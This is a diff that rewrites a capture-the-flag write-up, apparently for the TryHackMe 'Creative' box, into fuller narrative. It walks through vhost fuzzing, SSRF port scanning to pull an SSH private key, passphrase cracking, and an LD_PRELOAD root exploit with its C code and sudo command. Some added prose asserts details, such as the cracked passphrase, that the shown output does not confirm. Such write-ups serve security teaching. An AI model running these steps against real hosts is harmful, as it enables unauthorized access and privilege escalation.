@@ -95,7 +95,7 @@ Open 10.10.133.96:22
 
 ```
 
-Did some DNS enumeration using `ffuf`
+With only a plain marketing site responding on port 80, my next instinct was to check whether the box was hosting additional virtual hosts behind the scenes, since a single-service nmap result on a box like this usually means the real application is hiding behind a name I have not tried yet. I ran a vhost fuzz against the base domain with `ffuf`, feeding it a Host header wordlist rather than a path wordlist.
 
 ```bash
 └─[$]> ffuf -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -c -u http://creative.thm  -H "Host: FUZZ.creative.thm" --mc all --fs 178 
@@ -125,7 +125,7 @@ ________________________________________________
 beta                    [Status: 200, Size: 591, Words: 91, Lines: 20
 ```
 
-I found the DNS name `beta`. Visited the website and there is a user input. it asks for a url. I then tested this function by capturing the request in `burpsuite` then afterwards put my `IP` address using python http server to host a http server to see what whould happen. I entered the url `http://10.6.59.97:8000/test`. I then get the page that just says `Dead`.
+That fuzz turned up a `beta` subdomain, so I added `beta.creative.thm` to my hosts file and went to take a look. The site there is built around a single feature: a form that asks for a URL, which immediately told me the server is fetching that URL on my behalf somewhere in the backend, exactly the kind of functionality I want to test for SSRF. Rather than guessing blind, I captured the request in Burp Suite first so I could see the raw request structure, then stood up a local Python HTTP server and pointed the form at my own IP to see whether the application would actually reach out and touch it. I submitted `http://10.6.59.97:8000/test` and got back a page that just read `Dead`, which on its own did not tell me much, so I went to check my listener.
 
 ### Request captured
 
@@ -148,9 +148,7 @@ Sec-GPC: 1
 url=http%3A%2F%2F10.6.59.97%3A8000%2Ftest
 ```
 
-From here we see the `url` parameter within the request. I am going to try command injection to see if it does anything.
-
-this was also the output of my python http server.
+Looking at the captured request, the `url` parameter was the obvious injection point, sitting right there in the POST body as a URL-encoded value. Before testing for SSRF specifically, I wanted to rule out plain command injection as well, in case the backend was shelling out to fetch the URL rather than using a proper HTTP client. In the meantime, though, my Python HTTP server had already started catching something interesting.
 
 ```bash
 ┌─[abadd0n@EX3CP01S0N] - [~/thm/boxes/creative] - [Thu Jul 25, 21:11]
@@ -164,7 +162,7 @@ Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
 10.10.133.96 - - [25/Jul/2024 21:22:35] "GET /test HTTP/1.1" 404 -
 ```
 
-It keeps sending requests to the server but every once and a while it sends something extra to the `url`.
+The server kept polling my listener repeatedly, and every so often the request path carried something extra tacked on after the `url` I had originally submitted, which was my first hint that the application was doing more than a single one-shot fetch.
 
 ```bash
 10.10.133.96 - - [25/Jul/2024 21:23:25] code 404, message File not found
@@ -173,7 +171,7 @@ It keeps sending requests to the server but every once and a while it sends some
 10.10.133.96 - - [25/Jul/2024 21:23:25] "GET /test HTTP/1.1" 404 -
 ```
 
-So I have found remove file inclusion. I did the following to test for it.
+That behavior pointed me toward remote file inclusion rather than command injection, the application appeared to be fetching and possibly including whatever content lived at the URL I gave it. To confirm that theory cleanly, I set up a second listener and served up a distinctive test file to see if its content would surface anywhere in the response.
 
 ```bash
 ┌─[abadd0n@EX3CP01S0N] - [~/thm/boxes/creative] - [Thu Jul 25, 21:47]
@@ -182,17 +180,17 @@ Serving HTTP on 0.0.0.0 port 9999 (http://0.0.0.0:9999/) ...
 10.10.133.96 - - [25/Jul/2024 21:47:36] "GET /poc.html HTTP/1.1" 200 -
 ```
 
-I added the following file `poc.html`.
+The proof-of-concept file itself was intentionally simple, just enough to be unmistakable if it showed up somewhere it should not.
 
 ```html
 <h1>REMOTE FILE INCLUSION!</h1>
 ```
 
-On the website after entering the `url` we have this.
+Sure enough, pointing the form's `url` field at that file confirmed it: my content was being pulled in exactly as expected.
 
 ![Pasted image 20240725214901](Pasted-image-20240725214901.png)
 
-Tried to test for command injection again
+Before committing fully to the SSRF angle, I circled back and gave command injection one more serious attempt, just to be thorough and rule it out with an actual payload list rather than a guess.
 
 ```bash
 └─[$]> ffuf -w /usr/share/SecLists/Fuzzing/command-injection-commix.txt -u http://beta.creative.thm/ -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "url=FUZZ" -fw 3
@@ -223,9 +221,7 @@ ________________________________________________
 [WARN] Caught keyboard interrupt (Ctrl-C)
 ```
 
-And we got nothing. With remote file inclusion in mind we can try `ssrf`.
-
-I tried to use `ssrfmap` to do a port scan but I got errors so I am going to try to use `ffuf` instead.
+That fuzz came back empty, which confirmed command injection was not the way in here. With the remote file inclusion behavior already confirmed, my attention turned fully to SSRF, and specifically to using that server-side fetch as a way to probe ports that were not exposed externally. My first attempt was to reach for `ssrfmap` to automate a port scan through the vulnerable parameter, but it kept throwing errors against this target, so rather than fight the tool, I fell back to something I trust more directly: driving the scan myself with `ffuf`.
 
 ```bash
 seq 0 99999 > ports.lst 
@@ -262,13 +258,13 @@ ________________________________________________
 1337                    [Status: 200, Size: 1143, Words: 40, Lines: 39]
 ```
 
-these are the results that we got. We can try to enter them in the `url` user input on the website to see what we get.
+Sweeping the full local port range this way turned up something worth chasing: alongside the expected web ports, port `1337` responded differently from the noise around it, which made it my next target to poke through the `url` field directly.
 
 ![Pasted image 20240725220831](Pasted-image-20240725220831.png)
 
-Nice we get a directory listing!
+That was exactly the kind of result I was hoping for, an internal service handing back a directory listing, reachable only because the vulnerable server was making the request on my behalf.
 
-After entering a few more urls we can find the user `saad` ssh private key to ssh into the machine.
+From there it was just a matter of walking that listing and requesting paths of interest through the SSRF, and it did not take long before I found my way to `saad`'s SSH private key.
 
 ```bash
 http://127.0.0.1:1337/home/saad/.ssh/id_rsa
@@ -281,7 +277,7 @@ http://127.0.0.1:1337/home/saad/.ssh/id_rsa
 Enter passphrase for key 'id_rsa': 
 ```
 
-we need to crack the password.
+Trying to use the key directly, I hit a passphrase prompt, which meant the key itself was of no use to me until I cracked whatever protected it. `ssh2john` converts a protected private key into a crackable hash format, and from there I handed it straight to `john` against `rockyou.txt`.
 
 ```bash
 ssh2john id_rsa > hash
@@ -299,6 +295,7 @@ Use the "--show" option to display all of the cracked passwords reliably
 Session completed. 
 ```
 
+`john` cracked the passphrase to `sweetness` in under thirty seconds, which was enough to unlock the key and log in over SSH as `saad`. With a proper shell in hand, my next step was automated enumeration rather than manually poking around, so I dropped `linpeas` on the box to surface anything obviously worth chasing for privilege escalation.
 
 ### Linpeas
 
@@ -436,7 +433,7 @@ ls -ld /var/lib/mysql
 
 ```
 
-With the found credentials we can do `sudo -l`
+The most useful thing `linpeas` turned up was not a binary or a misconfigured file, it was `saad`'s own shell history, which had a plaintext sudo password sitting in it from an earlier `echo` command he had apparently run while setting something up. Credentials like that are exactly why I always check history files, `.bash_history` in particular is a goldmine of things people meant to be temporary. With that password in hand, checking `sudo -l` was the obvious next move.
 
 ```bash
 saad@m4lware:~$ sudo -l
@@ -448,7 +445,7 @@ User saad may run the following commands on m4lware:
     (root) /usr/bin/ping
 ```
 
-Looking back at this I see we have something called env LD_PRELOAD. I did some research and we can use this to privesc.
+What caught my eye in that output was not the `ping` binary itself, `ping` running as root under `sudo` is common and usually harmless, but the `env_keep+=LD_PRELOAD` entry sitting in the sudoers defaults right above it. That setting tells `sudo` to preserve the `LD_PRELOAD` environment variable across the privilege boundary instead of stripping it, which is a well known privilege escalation primitive: if I can get the dynamic linker to load a shared object of my choosing before `ping` runs, that code executes with root's privileges the instant the binary starts. I put together a small shared library to take advantage of exactly that.
 
 
 ```c
@@ -463,7 +460,9 @@ void _init() {
 }
 ```
 
-https://www.hackingarticles.in/linux-privilege-escalation-using-ld_preload/
+I leaned on this reference to make sure my constructor function was structured correctly: https://www.hackingarticles.in/linux-privilege-escalation-using-ld_preload/
+
+The `_init` function fires automatically the moment the shared object is loaded, before `ping` even gets to its own main logic, so dropping a `setuid(0)`/`setgid(0)` and spawning a shell there gives me a root shell before the binary has done anything else at all. Compiling it as a position-independent shared object and pointing `LD_PRELOAD` at it on a `sudo` invocation was all that was left to do.
 
 ```bash
 saad@m4lware:~$ gcc -fPIC -shared -o privesc.so privesc.c -nostartfiles
@@ -480,3 +479,5 @@ saad@m4lware:~$ sudo LD_PRELOAD=/tmp/privesc.so ping
 uid=0(root) gid=0(root) groups=0(root)
 # 
 ```
+
+The moment `ping` loaded my library under `sudo`, it dropped me straight into a root shell, confirmed by `id` reporting `uid=0(root)`. That closed out the box: an SSRF that turned into remote file inclusion, a leaked SSH key I had to crack, a password left behind in shell history, and a classic `LD_PRELOAD` privilege escalation to finish it off.
